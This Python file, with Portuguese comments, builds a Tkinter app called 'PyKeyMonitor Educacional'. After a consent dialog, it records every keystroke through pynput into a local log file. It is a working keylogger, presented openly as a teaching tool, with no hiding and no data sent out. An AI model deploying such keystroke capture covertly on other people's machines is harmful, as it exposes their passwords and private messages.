import tkinter as tk
from tkinter import messagebox, PhotoImage
from pynput import keyboard
from datetime import datetime
import os

# Caminho do log
log_path = "exemplo_logs"
os.makedirs(log_path, exist_ok=True)
log_file = os.path.join(log_path, "log_01.txt")

# Variável de controle
monitorando = False

def escrever_log(tecla):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            if tecla == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"{tecla.char if hasattr(tecla, 'char') else str(tecla)} ")
    except Exception as e:
        print(f"Erro ao escrever no log: {e}")

def iniciar_monitoramento():
    global monitorando
    if monitorando:
        return
    monitorando = True
    escrever_log(f"\n\n[INÍCIO] Monitoramento iniciado em {datetime.now()}\n")

    def on_press(tecla):
        if not monitorando:
            return False
        escrever_log(tecla)

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def parar_monitoramento():
    global monitorando
    if monitorando:
        escrever_log(f"\n[FIM] Monitoramento encerrado em {datetime.now()}\n")
        monitorando = False
        messagebox.showinfo("Finalizado", "Monitoramento encerrado com sucesso.")
        root.destroy()

def exibir_consentimento():
    resposta = messagebox.askyesno(
        "Consentimento",
        "Este programa monitora suas teclas APENAS com propósito educacional.\nDeseja continuar?"
    )
    if resposta:
        iniciar_monitoramento()
    else:
        root.destroy()

# GUI
root = tk.Tk()
root.title("PyKeyMonitor Educacional")
root.geometry("380x200")
root.resizable(False, False)

# ====== Adicionando a logo personalizada ======
try:
    icone = PhotoImage(file="C:/Users/Max/Desktop/PyKeyMonitor/MM.png")  # Use logo.ico se preferir (no Windows)
    root.iconphoto(False, icone)
except Exception as e:
    print("Erro ao carregar a logo:", e)

# Define cor de fundo geral
bg_color = "#2e2e2e"
fg_color = "white"
root.configure(bg=bg_color)

# Título
tk.Label(
    root,
    text="PyKeyMonitor Educacional",
    font=("Arial", 16, "bold"),
    bg=bg_color,
    fg=fg_color
).pack(pady=10)

# Descrição
tk.Label(
    root,
    text="Este programa monitora teclas pressionadas\ncom fins exclusivamente educacionais.",
    font=("Arial", 10),
    bg=bg_color,
    fg=fg_color
).pack()

# Botões
tk.Button(
    root,
    text="Aceitar e Iniciar Monitoramento",
    command=exibir_consentimento,
    bg="#00495C",
    fg="white",
    width=30
).pack(pady=15)

tk.Button(
    root,
    text="Cancelar",
    command=root.destroy,
    bg="#740902",
    fg="white",
    width=30
).pack()

root.protocol("WM_DELETE_WINDOW", parar_monitoramento)
root.mainloop()
